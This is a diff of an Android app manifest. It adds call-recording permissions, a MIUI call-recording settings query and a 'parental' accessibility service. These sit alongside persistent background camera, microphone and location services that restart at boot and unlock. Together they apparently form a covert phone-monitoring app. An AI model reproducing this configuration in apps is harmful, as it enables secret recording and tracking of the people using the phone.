@@ -43,7 +43,19 @@
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <!-- Call Recording Permissions -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
 
+    <queries>
+        <intent>
+            <action android:name="miui.intent.action.CALL_RECORDING_SETTINGS" />
+        </intent>
+    </queries>
 
     <application
         android:allowBackup="true"
@@ -67,20 +79,14 @@
         </activity>
         
         <service
-            android:name=".service.ScreenCaptureService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="mediaProjection" />
-            
-        <service
-            android:name=".service.BackgroundService"
+            android:name=".BackgroundService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync|camera|microphone|location"
             android:stopWithTask="false" />
             
         <service
-            android:name=".PersistentJobService"
+            android:name=".service.PersistentJobService"
             android:permission="android.permission.BIND_JOB_SERVICE"
             android:exported="false" />
             
@@ -100,11 +106,12 @@
         </receiver>
         
         <receiver
-            android:name=".BootServiceRestartReceiver"
+            android:name=".service.BootServiceRestartReceiver"
             android:enabled="true"
             android:exported="true"
             android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
-            <intent-filter>
+
+        <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
@@ -115,13 +122,26 @@
         </receiver>
 
         <receiver
-            android:name=".UnlockReceiver"
+            android:name=".service.UnlockReceiver"
             android:enabled="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.USER_PRESENT" />
             </intent-filter>
         </receiver>
+
+        <service
+            android:name=".service.ParentalAccessibilityService"
+            android:exported="false"
+            android:enabled="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
     </application>
 
 </manifest>
